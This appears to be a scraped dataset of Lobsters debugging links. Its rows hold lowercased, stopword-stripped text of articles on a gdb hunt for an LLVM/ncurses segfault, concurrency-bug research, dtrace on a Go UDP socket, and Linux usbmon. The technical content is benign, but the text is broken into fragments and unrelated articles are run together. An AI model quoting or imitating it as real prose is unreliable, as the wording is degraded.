appsperftoolsbinuprobe p setcurterm di tracing uprobe setcurterm p setcurterm di ctrlc end setcurterm setcurterm setcurterm setcurterm c work setcurterm called called four time last time passed zero sound like could problem wondering knew di register first argument come abi assumption compiled library abi compliant reminder man syscall archabi note armoabi armeabi blackfin ebx ecx edx esi edi ebp see parisc rdi rsi rdx also like see stack trace invocation ftrace tool nt support stack trace yet external bccbpf since debugging bcc tool cachetoppy worth noting bcc tracepy capability like older uprobe tool tracepy p tinfo setcurterm time pid comm func python setcurterm python setcurterm python setcurterm python setcurterm yes using bcc debug bcc new bcc worth checking provides python lua interface new bpf tracing feature linux series short allows lot performance tool previously impossible prohibitively expensive run posted instruction running ubuntu xenial bcc tracepy tool switch printing user stack trace since kernel bpf stack capability linux although time writing nt added switch yet breakpoints really used gdb breakpoints setcurterm start hope interesting detour ftrace bpf back live running mode gdb python gnu gdb ubuntu gdb b setcurterm function setcurterm defined make breakpoint pending future shared library load n breakpoint setcurterm pending gdb r cachetoppy starting program usrbinpython cachetoppy thread debugging using libthreaddb enabled using host libthreaddb library breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm ok breakpoint see setcurterm invoked argument thanks debuginfo information nt debuginfo could print register breakpoint print stack trace see setting curterm gdb bt setcurterm llvm sys process filedescriptorhascolors int clang driver tool clang constructjob clang driver compilation clang driver jobaction const clang driver inputinfo const llvm smallvector clang driver inputinfo const llvm opt arglist const char const const clang driver driver buildjobsforaction clang driver compilation clang driver action const clang driver toolchain const char const bool bool char const clang driver inputinfo const clang driver driver buildjobs clang driver compilation const clang driver driver buildcompilation llvm arrayref char const ebpf clangloader parse std uniqueptr llvm module std defaultdelete llvm module std uniqueptr std vector ebpf tabledesc std allocator ebpf tabledesc std defaultdelete std vector ebpf tabledesc std allocator ebpf tabledesc std basicstring char std chartraits char std allocator char const bool char const int ebpf bpfmodule loadcfile std basicstring char std chartraits char std allocator char const bool char const int ebpf bpfmodule loadstring std basicstring char std chartraits char std allocator char const char const int bpfmodulecreatecfromstring fficall ctypescallproc pyobjectcall pyevalevalframeex pyevalevalcodeex pyobjectcall pyobjectcall pyobjectcall pyevalevalframeex pyevalevalcodeex pyobjectcall pyevalevalframeex pyevalevalcodeex pyevalevalframeex pyevalevalcodeex pyevalevalcode pyrunfileexflags pyrunsimplefileexflags pymain libcstartmain main init optimized fini optimized rtldfini optimized start ok clue think llvm sys process filedescriptorhascolors llvm compiler external cscope take source code browsing using cscope time llvm filedescriptorhascolors function static bool terminalhascolors int fd extract structure allocated setupterm free memory really silly dance struct term termp setcurterm struct term nullptr void delcurterm termp drop error code used earlier version static bool terminalhascolors const char term std getenv term modern terminal support ansi escape sequence color could check terminfo list known term support color would overkill user always ask color setting term dumb using commandline flag return strcmp term dumb return false became silly dance involving calling setcurterm null pointer writing memory experiment explore possible workaround modify memory running process avoid setcurterm zero run gdb set breakpoint setcurterm take zero invocation gdb python gnu gdb ubuntu gdb b setcurterm function setcurterm defined make breakpoint pending future shared library load n breakpoint setcurterm pending gdb r cachetoppy starting program usrbinpython cachetoppy thread debugging using libthreaddb enabled using host libthreaddb library breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm termptermp gdb c continuing breakpoint setcurterm point use set command overwrite memory replace zero previous argument setcurterm seen hope still valid warning writing memory safe gdb wo nt ask sure get wrong make typo corrupt application best case application crash immediately realize mistake worst case application continues silently corrupted data discovered year later case experimenting lab machine production data continue print value rdi register hex px set previous address print print register gdb px rdi gdb set gdb px rdi gdb r rax rbx rcx rdx rsi rdi rbp rsp rip setcurterm eflags pf zf c s d e f g since point debug info installed nt need refer register case could called set termp variable name argument setcurterm instead rdi rdi populated register look ok continue gdb c continuing breakpoint setcurterm termptermp ok survived call setcurterm however hit another also argument zero trying write trick gdb set gdb c continuing warning jited object file architecture unknown compatible target architecture program received signal sigsegv segmentation fault clrblank backcolorerase ahhh get writing memory experiment ended another segfault conditional breakpoints previous section use three continues reach right invocation breakpoint hundred invocation use conditional breakpoint example run program break setcurterm usual gdb python gnu gdb ubuntu gdb b setcurterm function setcurterm defined make breakpoint pending future shared library load n breakpoint setcurterm pending gdb r cachetoppy starting program usrbinpython cachetoppy thread debugging using libthreaddb enabled using host libthreaddb library breakpoint setcurterm termptermp turn breakpoint conditional breakpoint fire rdi register zero gdb cond gdb b num type disp enb address breakpoint keep setcurterm stop breakpoint already hit time gdb c continuing breakpoint setcurterm gdb neat cond short conditional nt run right away first created pending breakpoint found conditionals nt work pending breakpoints least gdb version either wrong also used b info breakpoints list information return try another writelike hack time changing instruction path rather data warning see previous warning also applies take u setcurterm breakpoint issue ret short return return function immediately execute hope executing wo nt set global curterm gdb c continuing breakpoint setcurterm gdb ret make setcurterm return n llvm sys process filedescriptorhascolors int gdb c continuing program received signal sigsegv segmentation fault ncfreetermtype ptrptr freeifneeded ptr strtable another crash get messing way one try browsing code bit want try ret twice case parent function also involved hacky experiment gdb c continuing breakpoint setcurterm gdb ret make setcurterm return n llvm sys process filedescriptorhascolors int gdb ret make selected stack frame return n clang driver tool clang constructjob clang driver compilation clang driver jobaction const clang driver inputinfo const llvm smallvector const llvm opt arglist const char const const gdb c screen go blank pause redraws buffer mb cached mb pid uid cmd hit miss dirties readhit writehit root systemdlogind root messageb dbusdaemon root systemd syslog r main q reg root systemdjournal root accountsdaemon root bash root lesspipe root bash root bash root bash root bash root bash root bash root uname root bash root dircolors root basename root dirname root l wow working better workaround posting debugging output github especially since lead bpf engineer alexei starovoitov also well versed llvm internals root cause seemed bug llvm messing writes return suggested adding llvm option fnocolordiagnostics bcc avoid problem code path worked added bcc workaround get llvm bug fixed python context point fixed problem might curious see stack trace fully fixed adding pythondbg aptget install pythondbg reading package list done following additional package installed libpythondbg suggested package pythongdbmdbg pythontkdbg following new package installed libpythondbg pythondbg upgraded newly installed remove upgraded need get mb archive operation mb additional disk space used rerun gdb view stack trace gdb python gnu gdb ubuntu reading symbol usrbinpython reading symbol done gdb bt clrblank clrupdate doupdate wrefresh winwin recurwrefresh winwin ncwgetch winwin resultresult wgetch args callfunction oparg optimized pyevalevalframeex pyevalevalcodeex functioncallltopriv pyobjectcall extdocall na optimized flag optimized func function remote pyevalevalframeex pyevalevalcodeex fastfunction na optimized n optimized func function remote callfunction oparg optimized pyevalevalframeex pyevalevalcodeex pyevalevalcode co optimized globals optimized local optimized runmodltopriv pyrunfileexflags pyrunsimplefileexflags pymain libcstartmain main init optimized fini optimized rtldfini optimized start hugely helpful yet python debug package added capability gdb look python backtrace gdb pybt traceback recent call first file cachetoppy line handleloop stdscrgetch file line wrapper return func stdscr args kwds file cachetoppy line curseswrapper handleloop args python source list gdb pylist battachkprobe event markbufferdirty fnname docount exiting stdscrgetch ord q exiting elif ord r sortreverse sortreverse elif ord identifying python code executing hit segfault really nice problem initial stack trace seeing python internals executing method method debugging another language complierruntime end executing code web search language name gdb might find gdb debugging extension like python nt bad news need write good news even possible search documentation adding new gdb command python written python might look like written comprehensive tour gdb really nt lot gdb help command list major section gdb help list class command alias alias command breakpoints making program stop certain point data examining data file specifying examining file internals maintenance command obscure obscure feature running running program stack examining stack status status inquiry support support facility tracepoints tracing program execution without stopping program userdefined userdefined command type help followed class name list command class type help list command type help followed command name full documentation type apropos word search command related word command name abbreviation allowed unambiguous run help command class example full listing breakpoints gdb help breakpoints making program stop certain point list command awatch set watchpoint expression break set breakpoint specified location breakrange set breakpoint address range catch set catchpoints catch event catch assert catch failed ada assertion catch catch catch exception catch exception catch ada exception catch exec catch call exec catch fork catch call fork catch load catch load shared library catch rethrow catch exception catch signal catch signal name andor number catch syscall catch system call name andor number catch throw catch exception catch unload catch unloads shared library catch vfork catch call vfork clear clear breakpoint specified location command set command executed breakpoint hit condition specify breakpoint number n break cond true delete delete breakpoints autodisplay expression delete bookmark delete bookmark bookmark list delete breakpoints delete breakpoints autodisplay expression delete checkpoint delete checkpoint experimental delete display cancel expression displayed program stop delete mem delete memory region delete tracepoints delete specified tracepoints delete tvariable delete one trace state variable disable disable breakpoints disable breakpoints disable breakpoints disable display disable expression displayed program stop disable framefilter gdb command disable specified framefilter disable mem disable memory region disable prettyprinter gdb command disable specified prettyprinter disable probe disable probe disable tracepoints disable specified tracepoints disable typeprinter gdb command disable specified typeprinter disable unwinder gdb command disable specified unwinder disable xmethod gdb command disable specified group xmethod dprintf set dynamic printf specified location enable enable breakpoints enable breakpoints enable breakpoints enable breakpoints count enable breakpoints count hit enable breakpoints delete enable breakpoints delete hit enable breakpoints enable breakpoints one hit enable count enable breakpoints count hit enable delete enable breakpoints delete hit enable display enable expression displayed program stop enable framefilter gdb command disable specified framefilter enable mem enable memory region enable enable breakpoints one hit enable prettyprinter gdb command enable specified prettyprinter enable probe enable probe enable tracepoints enable specified tracepoints enable typeprinter gdb command enable specified type printer enable unwinder gdb command enable unwinders enable xmethod gdb command enable specified group xmethod ftrace set fast tracepoint specified location hbreak set hardware assisted breakpoint ignore set ignorecount breakpoint number n count rbreak set breakpoint function matching regexp rwatch set read watchpoint expression save save breakpoint definition script save breakpoints save current breakpoint definition script save gdbindex save gdbindex file save tracepoints save current tracepoint definition script skip ignore function stepping skip delete delete skip entry skip disable disable skip entry skip enable enable skip entry skip file ignore file stepping skip function ignore function stepping strace set static tracepoint location marker tbreak set temporary breakpoint tcatch set temporary catchpoints catch event tcatch assert catch failed ada assertion tcatch catch catch exception tcatch exception catch ada exception tcatch exec catch call exec tcatch fork catch call fork tcatch load catch load shared library tcatch rethrow catch exception tcatch signal catch signal name andor number tcatch syscall catch system call name andor number tcatch throw catch exception tcatch unload catch unloads shared library tcatch vfork catch call vfork thbreak set temporary hardware assisted breakpoint trace set tracepoint specified location watch set watchpoint expression type help followed command name full documentation type apropos word search command related word command name abbreviation allowed unambiguous help illustrate many capability gdb needed use example final word well kind nasty issue llvm bug breaking ncurses causing python program segfault command procedure used debug mostly routine viewing stack trace checking register setting breakpoints stepping browsing source first used gdb year ago really nt like felt clumsy limited gdb improved lot since gdb skill see powerful modern debugger feature set vary debugger gdb may powerful textbased debugger nowadays lldb catching hope anyone searching gdb example find full output shared useful well various caveat discussed along way maybe post gdb session get chance especially runtimes like java q quit gdb
554,Lobsters,debugging,Debugging,Notes on concurrency bugs,http://danluu.com/concurrency-bugs/,note concurrency bug,note concurrency bug reported bug distributed system simple checker look totally unimplemented error handling find hundred serious data corruption bug nondeadlock bug deadlock bug examined failure semantic examined failure latent examined nondeadlock bug atomicityviolation orderviolation bug see nt obvious time resurfaced fixed fix another bug caused regression deadlock found deadlock occurs following four condition true examined concurrency bug could reproduced fixing relative order specific thread examined deadlock bug caused two thread waiting two resource caveat hapset patent listing pacer completely different pacer conlock magiclock magicfuzzer omen wolf sherlock atomchase racageddon valgrind drd helgrind couple tweak happensbefore tsan large impact real world clang distributed system messagemessage race diagram mapreduce bug mapreduce bug messagecompute race mapreduce bug atomicity violation mapreduce bug fault timing mapreduce bug reboot timing mapreduce bug examined bug led latent failure people mostly nt even bother filing fixing bug hardware fault nondistributed software examined bug triggered single message timing bug simple fix bug cause bad node obviously bad mace modist demeter samc jepsen actually available maintained chaos monkey conclusion paper afl rose ames sinofsky,note concurrency bug concurrency bug matter literature know reported bug distributed system really simple cause caught trivial test even look bug cause really bad failure like loss cluster data corruption filesystem literature echo result simple checker look totally unimplemented error handling find hundred serious data corruption bug bug simple least measure bug count measure debugging time story bit different personal experience spent time debugging complex nondeterministic failure type bug combined fact spent time debugging individual nondeterministic bug week month bug type combined nondeterministic bug rare extremely hard debug productivity killer bad nondeterministic bug take long debug relatively large investment tool prevention worth let see academic literature say nondeterministic bug lot literature let narrow thing looking one relatively well studied area concurrency bug start literature singlemachine concurrency bug look distributed concurrency bug studied mysql concurrency bug found following nondeadlock bug deadlock bug note number sum bug tagged multiple cause roughly line lu et al asplos paper look later found bug examined deadlock bug examined failure semantic paper defines semantic failure one application provides user result violates intended semantics application author also find vast majority semantic bug generated subtle violation application semantics nature failure likely undercounted pretty hard miss deadlock easy miss subtle data corruption examined failure latent paper defines latent bug become immediately visible user unsurprisingly paper find latent failure closely related semantic failure latent failure semantic vice versa number make finding sound precise really semantic failure latent vice versa could easily interesting hard tell result generalize project nt database even project nt mysql looked concurrency bug mysql firefox openoffice apache finding examined nondeadlock bug atomicityviolation orderviolation bug nondeadlock bug studied atomicity bug ordering bug categorized example atomicity violation bug mysql thread thd procinfo fputs thd procinfo thread thd procinfo null anyone nt used c c thd pointer operator access field pointer first line thread check field null second line call fputs writes field intent call fputs procinfo nt null nothing preventing another thread setting procinfo null first second line thread like bug bug obvious retrospect look original bug report see nt obvious time description noticed latest bk tree mysql regularly crash innodb code repeat still clue crash occurs common large codebases fixing bug diagnosed complicated first seemed bug partially fixed resurfaced fixed fix another bug caused regression also fixed fix introduced deadlock found example ordering bug following bug firefox thread mthreadprcreatethread mmain thread void mmain mstate mthread state thread launch thread prcreatethread thread assumes line launched assigned mthread mthread valid thread start executing thread assigned mthread author note call ordering bug atomicity bug even though bug could prevented line thread atomic bug pattern categorization based root cause regardless possible fix strategy example bug one two studied bug mysql thread n rwlock lock watchdog thread lockwaittime fataltimeout assert cause spurious crash expected amount work note study nt look performance bug bug lock contention cause thing slow crawl watchdog nt kill program would nt considered aside probably topic another post hardware often deadlock livelock detection built lock condition detected hardware often try push thing state normal execution continue detecting breaking deadlocklivelock error typically logged way noticed caught lab external customer wo nt see reason strategy seems rare software world although seems like easier software hardware deadlock occurs following four condition true mutual exclusion least one resource must held nonshareable mode one process use resource given instant time hold wait resource holding process currently holding least one resource requesting additional resource held process preemption resource released voluntarily process holding circular wait process must waiting resource held another process turn waiting first process release resource nothing condition unique either hardware software easier build mechanism back replay relax software hardware anyway back study finding examined concurrency bug could reproduced fixing relative order specific thread sound like great news testing testing ordering thread pair much tractable testing ordering thread similarly examined bug could reproduced fixing order four fewer memory access however kind sampling bias bug could reproduced could analyzed root cause bug require ordering two thread memory access easier reproduce examined deadlock bug caused two thread waiting two resource moreover examined deadlock bug caused thread acquiring resource held thread author state pairwise testing acquisition release sequence able catch deadlock bug pairwise testing thread ordering able catch nondeadlock bug claim seems plausibly true read written implication seems virtually bug caught kind pairwise testing bit skeptical due sample bias bug studied seen bug many moving part take month track worst bug seen consumed nearly personyear worth time bug like mostly nt make study like rare job allows someone time chase bug elusive many bug like still open question caveat note program studied written c c study predates moving using atomics scoped lock would probably change number substantially mention moving entirely different concurrency model academic work different concurrency model affect bug rate really clear work generalizes codebases large mature one studied nature large mature codebases hard randomized trial trial involves changing fundamental primitive used author note examined bug could prevented using transactional memory clear many bug might introduced transactional memory used paper characterizing singlemachine concurrency bug interest space going skip also paper distributed concurrency bug get let look tooling finding singlemachine concurrency bug literature find paper pretty interesting especially model checking work realistically probably going build tool scratch something available let look hapset us runtime coverage generate interleavings nt covered yet nec lab googling nec lab hapset return paper patent listing obvious download tool generates unique interleavings thread run claim tracking state checker much simpler would otherwise able avoid many disadvantage tracking state via detail ca nt properly described tiny little paragraph read paper interested support c c page claim requires visual studio tested code nt tried run modern nix compiler ime requiring visual studio mean would moderate effort get running modern version visual studio substantial effort get running modern version gcc clang quick google search indicates might patent encumbered us coverage generate interleavings nt covered yet instrument pthreads source github possible tool still usable probably give shot point depends least one old apparently unmaintained tool pin binary instrumentation tool intel googling binging either maple pin give number result people ca nt even get tool compile let alone use tool pacer sample using fasttrack algorithm order keep overhead low enough consider production software ironically implemented top jikes rvm unlikely used actual production software reference could find actually downloadable tool completely different pacer conlock magiclock magicfuzzer series tool one group claim get good result using various technique afaict source nt available tool page claim version magicfuzzer available link binary nt specify platform binary link omen wolf could nt find page tool paper let alone download link sherlock atomchase racageddon another series tool nt obviously available valgrind drd helgrind instrument pthreads easy use run valgrind appropriate option drd helgrind binary may require couple tweak using threading find data race flag happensbefore violated work pthreads thread easy use pas fsanitizethread clang side effect easy use actually available tsan large impact real world one interesting incident occurred open source chrome browser known crash attributed one bug proved difficult understand chrome engineer spent month tracking bug without success hand tsan team found reason bug minute run without even knowing crash crash caused data race couple reference counter reason found relatively trivial fix quickly made patched subsequently bug closed clang wthreadsafety static analysis us annotation shared state determine state nt correctly guarded general static analysis java many feature guardedby annotation similar wthreadsafety java framework writing checker many different checker concurrency particular us guardedby like findbugs deterministic replay debugging easy get use appears actively maintained add support timetravel debugging gdb general toolkit give deterministic replay debugging also give dynamic slicing watchpointlike tell statement affected variable well statement affected variable currently linux claim window android support coming soon nt exhaustive list ton literature area frankly pretty unlikely time implement tool much value reading paper find technique implement however interested hearing tool usable one thing find interesting almost paper academic tool claim something novel let find bug found tool run tool codebase show tool capable finding new bug since almost one go run older tool codebase never know one newer tool found subset bug one older tool could catch furthermore see cycle livelock paper claim novel paper claim x paper ii claim novel nt need x unlike paper paper iii claim novel unlike paper ii x distributed system looked literature singlemachine concurrency bug distributed concurrency bug looked bug cassandra mapreduce hbase zookeeper let look example bug clarify terminology used study make easier understanding main finding messagemessage race diagram reference highlevel idea different part fit together mapreduce mapreduce bug resource manager sends taskinit message node manager shortly afterwards application master sends taskkill preemption node manager intent taskkill message kill task started taskinit message taskkill win race arrive taskinit example happens case two message different node racing get single node example mapreduce bug application master sends kill message node manager running speculative task another copy task finished however message received node manager node manager task completes causing complete message sent application master causing exception complete message received task completed messagecompute race one example mapreduce bug application master unregisters resource manager application master clean cleanup race resource manager sending kill message application container via node manager causing application master get killed note classified race atomicity bug get shortly computecompute race happen outside scope study since study look distributed concurrency bug atomicity violation purpose study atomicity bug defined whenever message come middle set event local computation global communication message come either event according definition messagecompute race looked nt atomicity bug would still bug message came computation started definition also mean hardware failure occur inside block must atomic considered atomicity bug see want define bug separate type bug find bit counterintuitive since consider different kind atomicity bug different bug caused breaking something need atomic case definition study mapreduce bug atomicty bug node manager process committing data hdfs resource manager kill task nt cause commit state change time node try rerun commit task task killed application manager commit believed already process fault timing fault defined component failure crash timeout unexpected latency one point paper refers hardware fault machine crash seems indicate fault could considered software fault defined hardware fault purpose study anyway purpose study example faulttiming issue mapreduce bug node manager crash committing result task rerun later attempt commit fail reboot timing study reboots classified separately fault mapreduce bug illustrates reboot bug resource manager sends job application master resource manager rebooted application master sends commit message back resource manager resource manager loses state throw exception getting unexpected complete message main finding examined bug led latent failure pretty large difference compared dsn paper found examined multithreading bug latent failure plausible real difference something due confounding variable hard tell data large difference study local concurrency bug found wonder much people mostly nt even bother filing fixing bug hardware fault nondistributed software examined bug triggered single message timing ordering violation atomicity violation furthermore bug involved three message fewer examined bug due fault reboot timing note purpose study hardware fault reboot break block needed atomic nt considered atomicity bug atomicity bug bug message arrives middle computation need atomic bug simple fix fixed ignoring badly timed message fixed delaying ignoring message bug cause reviewing bug author propose common fallacy lead bug one hop faster two hop zero hop faster one hop atomic block ca nt broken author note hardware fault reboots break atomic block system send kill preemption message break atomic block fallacy commonly seen postmortem listed go something like bad node obviously bad classic example system start handling query dropping quickly causing load balancer shift traffic bad node handling traffic quickly one favorite bug class actual system ringbased storage system node could health check neighbor declare neighbor dropped health check fails one node went bad dropped storage started reporting neighbor bad node neighbor noticed bad node bad bad node dropped storage super fast able report good neighbor good neighbor could report bad node ejecting immediate neighbor bad node got new neighbor raced new neighbor winning reason repeated entire cluster died mace set language extension c help build distributed system mace model checker check possible event ordering message interleaved crash reboots timeouts mace model checker actually available afaict requires using mace framework distributed system nt written mace modist another model checker check different ordering run one interleaving independent action partial order reduction avoid checking redundant state also interleaf timeouts unlike mace nt inject reboots nt appear available demeter like modist model checker injects type fault us different technique reduce state space nt know summarize succinctly see paper detail nt appear available googling demeter return software used model xray absorption samc another model checker inject multiple crash reboots us understanding system avoid redundant reordering eg series message invariant reboot injected system try avoid injecting reboot message nt appear available jepsen case nondistributed concurrency bug vast literature academic tool appear gradstudent code nt made available course jepsen nt attached academic paper probably realworld impact tool actually available maintained also chaos monkey understanding correctly unlike tool listed nt attempt create reproducible failure conclusion supposed conclusion nt conclusion looked literature found information bug interesting necessarily actionable read tool interesting actually available tool based old technique available useful example idea inside clang tsan using happensbefore find data race go back age paper discus combining two previously known race detection technique locksetbased detection happensbeforebased detection obtain fewer false positive locksetbased detection alone actually tsan tsan realized tool would impactful used happensbefore avoids false positive mean people actually use tool something likely turn paper get cited zillion time though anyone looked afl work story sound familiar afl emintently practical large impact real world mostly eschewing fancy technique recent literature must conclusion maybe conclusion individual like kyle kingsbury michal zalewski outsized impact industry probably pick underserved area testing curiously large impact entire industry rose ames asked tell big company story set story explains nt put blog post proximal cause vp getting negative comment writing reason bit long story part usual thing comment receive personally skew heavily positive comment manager get run way weird email someone manager like writing might send email writing really strike nerve explains someone management chain getting emailed writing nt explain email went vp switched team month ago org going switch overhired nt headcount heard conflicting number much overhired people org quite large would much well conflicting story happened honest mistake v group realizing hiring crunch coming hiring much possible take reqs rest org anyway reason org would worked hired allowed least one person instituted hiring freeze since new manager could nt hire org transferred org spare headcount hired new org new org happens sale org mean technically work sale impact daytoday life since resource tech talk accessible people product group another story anyway reason nt fully understand got hired org new manager month took org chart get updated shown parked vp meant anyone wanted fire email manager would look directory accidentally email vp instead nt seem like individual email big deal since nt much interaction vp nt want known guy writes stuff generates pushback inside company paused blogging nt exactly want known way manager either interact manager frequently enough least wo nt known also wonder email managervp likely current employer previous employer never happen know another employer total number time happened low enough might coincidence reading archive really insightful internal blog ran across note mentioned series blog post published internally author got static sinofsky publishing post contradicted party line eventually resulted author agreeing email sinofsky comment related anything sinofsky purview instead publishing comment publicly sinofsky moved author wanted share email would otherwise post internally kind thing nt seem freak occurance around time saw thing sinofsky ran across discussion whether pm within right tell someone take negative review app store apparently pm found someone written negative rating pm product app store emailed rater telling take review clear pm found rater worked u search internal directory every negative rating find somehow found issued demand people thought pm line nonzero number people addition pm thought employee say anything could construed negative company public feel like see kind thing company company really big tell anyone personal experience generalizes anyway probably start blogging org chart show report actual manager maybe manager get email maybe thanks leah hanson david turner justin mason joe wilder matt dziubinski alex blewitt bruno kim medeiros cesar luke gilliam ben karas julia evans michael ernst stephen tu commentscorrections
555,Lobsters,debugging,Debugging,Debugging using system calls in Mac OS X,http://bryce.is/writing/code/macosx/debugging/udp/sockets/dtruss/dtrace/eaddrinuse/2016/07/30/debugging-using-system-calls.html,debugging using system call mac o x,understanding udp go system call dtruss dtrace conclusion mutex,today want talk issue udp socket go learned program making use two tool ship mac o x called dtruss dtrace programming mac working project written go make use udp socket trying add unit test code decided create one around reconnections test created two socket localhost two different port readwrote closed repeated several hundred time eventually would receive bind address already use error upon creation socket wondered happening closing socket understanding udp go go use netlistenpacket method start listening udp packet given network address function return netpacketconn interface according go documentation packetconn close method either close connection return error type packetconn interface close close connection blocked readfrom writeto operation unblocked return error close error true getting eaddrinuse error time investigate first brief recap system call system call system call way program interface operating system unixbased system specifically compiled code contain software interrupt passed value corresponding function kernel case interested two system call bind close bind assigns file descriptor network address close deallocates file descriptor see program making system call like bind close dtruss dtruss tool ship mac o x written brendan gregg similar strace linux system use see system call program making kernel mean see program attempting close socket expect fact go standard library lying u running dtruss see something like sudo dtruss bind go test run testreconnect pidthrd relative elapsd cpu syscall args return close socket fcntl fcntl fcntl setsockopt bind err see bunch interesting information thread making syscalls long taking argument called return value one interesting thing last line end see err bind address already use error particular trace see first line look like close socket error last line say already use try bind confusingly refers file descriptor actual network address network address stored second argument pointer sockaddr struct passed kernel dereferenced would look something like struct sockaddr safamilyt safamily char sadata byte protocol address part interested sadata field need dereference pointer somehow possible enter dtrace dtrace dtrace powerful debugging tool originally built sun microsystems solaris also available mac o x amazing thing dtrace ship scripting language called script write tracing program execute upon entryreturn specified system call using actually write tracing around bind dereference sockaddr struct ultimately find port bound dtrace c go test run testreconnect n bind entry trace trace copyinstr f bind command saying execute go program whenever see bind system call invocation run script script tracing first two argument second argument tracing result function called copyinstr copyinstr function dereference pointer user space output result string running dtrace argument give something like bind entry b c e f end first line see file descriptor used like next line see output copyinstr dereferenced pointer sockaddr struct look like mostly unused memory look byte output see port number socket see file descriptor binding port whew using tool able see fact existing file descriptor still bound port subsequent bind call made conclusion digging go standard library eventually found answer go documentation mention blocked readfrom writeto call unblocked return error fails mention happens go close socket meaning even calling close netpacketconn guarantee socket actually closed due mutex around underlying file descriptor go solution case use semaphore code ensure readfrom writeto call returned attempting open new socket port important thing exercise able know certain understood program operating system mean could confident problem sitting layer stack happy debugging
556,Lobsters,debugging,Debugging,A look at DevOps tools landscape,https://devup.co/a-look-at-devops-tools-landscape-7220099c6b81#.jlqckymes,look devops tool landscape,,
559,Lobsters,debugging,Debugging,Using usbmon,https://www.kernel.org/doc/Documentation/usb/usbmon.txt,using usbmon,,usbmon introduction name usbmon lowercase refers facility kernel used collect trace io usb bus function analogous packet socket used network monitoring tool tcpdump ethereal similarly expected tool usbdump usbmon uppercase letter used examine raw trace produced usbmon usbmon report request made peripheralspecific driver host controller driver hcd hcd buggy trace reported usbmon may correspond bus transaction precisely situation tcpdump two apis currently implemented text binary binary api available character device dev namespace abi text api deprecated since available convenience use usbmon collect raw text trace unlike packet socket usbmon interface provides trace text format used two purpose first serf common trace exchange format tool sophisticated format finalized second human read case tool available collect raw text trace execute following step prepare mount debugfs enabled kernel configuration load usbmon module built module second step skipped usbmon built kernel mount debugfs nonedebugs syskerneldebug modprobe usbmon verify bus socket present l syskerneldebugusbusbmon choose either use socket capture packet bus skip step find bus used device step allows filter away annoying device talk continuously find bus connects desired device run cat syskerneldebugusbdevices find tline corresponds device usually looking vendor string many similar device unplug one compare two syskerneldebugusbdevices output tline bus number example dev mxch ver ifc mxps cfgs p rev manufactureraten mean bus alternatively look output lsusb get bus number appropriate line example bus device id aten start cat cat listen single bus otherwise listen bus type cat process read killed naturally output redirected desirable location preferred going quite long perform desired operation usb bus something creates traffic plug flash key copy file control webcam etc kill cat usually done keyboard interrupt controlc point output file example saved sent email inspected text editor last case make sure file size excessive favourite editor raw text data format two format supported currently original format format format deprecated kernel format add field iso frame descriptor interval etc produce slightly longer line otherwise perfect superset format desired recognize one program look address word see format add bus number colon present format otherwise text format data consists stream event urb submission urb callback submission error every event text line consists whitespace separated word number position word may depend event type set word common type list word left right urb tag used identify urbs normally inkernel address urb structure hexadecimal sequence number unique string within reason timestamp microsecond decimal number timestamp resolution depends available clock much worse microsecond implementation us jiffy example event type type refers format event urb type available type submission c callback e submission error address word formerly pipe consists four field separated colon urb type direction bus number device address endpoint number type direction encoded two byte following manner ci co control input output zi zo isochronous input output ii io interrupt input output bi bo bulk input output bus number device address endpoint decimal number may leading zero sake human reader urb status word either letter several number separated colon urb status interval start frame error count unlike address word field save status optional interval printed interrupt isochronous urbs start frame printed isochronous urbs error count printed isochronous callback event status field decimal number sometimes negative represents status field urb field make sense submission present anyway help script parsing error occurs field contains error code case submission control packet field contains setup tag instead group number easy tell whether setup tag present never number thus script find set number word proceed read data length except isochronous urbs find something else like letter read setup packet reading data length isochronous descriptor setup packet present consists word one bmrequesttype brequest wvalue windex wlength specified usb specification word safe decode setup tag otherwise setup packet present captured field contain filler number isochronous frame descriptor descriptor isochronous transfer event set descriptor total number urb printed first word per descriptor total word consists colonseparated decimal number status offset length respectively submission initial length reported callback actual length reported data length submission requested length callback actual length data tag usbmon may always capture data even length nonzero data word present tag data word follow big endian hexadecimal format notice machine word really byte stream split word make easier read thus last word may contain one four byte length collected data limited le data length reported data length word case isochronous input zi completion received data sparse buffer length collected data greater data length value data length count byte received whereas data word contain entire transfer buffer example input control transfer get port status c output bulk transfer send scsi command bulk wrapper storage device address c raw binary format api overall architecture api one event delivered binary format event sent following structure name made refer struct usbmonpacket id urb id submission callback unsigned char type text extensible unsigned char xfertype iso intr control bulk unsigned char epnum endpoint number transfer direction unsigned char devnum device address busnum bus number char flagsetup text char flagdata text binary zero ok tssec gettimeofday tsusec gettimeofday int status unsigned int length length data submitted actual unsigned int lencap delivered length union unsigned char setup setuplen control stype struct isorec iso int errorcount int numdesc iso int interval interrupt iso int startframe iso unsigned int xferflags copy urb transferflags unsigned int ndesc actual number iso descriptor total length event received character device reading read ioctl accessing buffer mmap however read return first byte compatibility reason character device usually called devusbmonn n usb bus number number zero special mean bus note specific naming policy set linux distribution create hand make sure owned root mode otherwise unprivileged user able snoop keyboard traffic following ioctl call available moniocmagic moniocqurblen defined io moniocmagic call return length data next event note majority event contain data call return zero mean event available moniocgstats defined ior moniocmagic struct monbinstats argument pointer following structure struct monbinstats queued dropped member queued refers number event currently queued buffer number event processed since last reset member dropped number event lost since last call moniocgstats monioctringsize defined io moniocmagic call set buffer size argument size byte size may rounded next chunk page requested size unspecified bound kernel call fails einval moniocqringsize defined io moniocmagic call return current size buffer byte moniocxget defined iow moniocmagic struct mongetarg moniocxgetx defined iow moniocmagic struct mongetarg call wait event arrive none kernel buffer return first event argument pointer following structure struct mongetarg struct usbmonpacket hdr void data sizet alloc length data zero call hdr data alloc filled upon return area pointed hdr contains next event structure data buffer contains data event removed kernel buffer moniocxget copy byte hdr area moniocxgetx copy byte moniocxmfetch defined iowr moniocmagic struct monmfetcharg ioctl primarily used application access buffer mmap argument pointer following structure struct monmfetcharg offvec vector event fetched nfetch number event fetch fetched nflush number event flush ioctl operates stage first remove discard nflush event kernel buffer actual number event discarded returned nflush second wait event present buffer unless pseudo device open ononblock third extract nfetch offset mmap buffer store offvec actual number event offset stored nfetch moniochmflush defined io moniocmagic call remove number event kernel buffer argument number event remove buffer contains fewer event requested event present removed error reported work event available fionbio ioctl fionbio may implemented future need addition ioctl read special file binary api polled select poll lseek work memorymapped access kernel buffer binary api basic idea simple prepare map buffer getting current size using mmap execute loop similar one written pseudocode struct monmfetcharg fetch struct usbmonpacket hdr int nflush 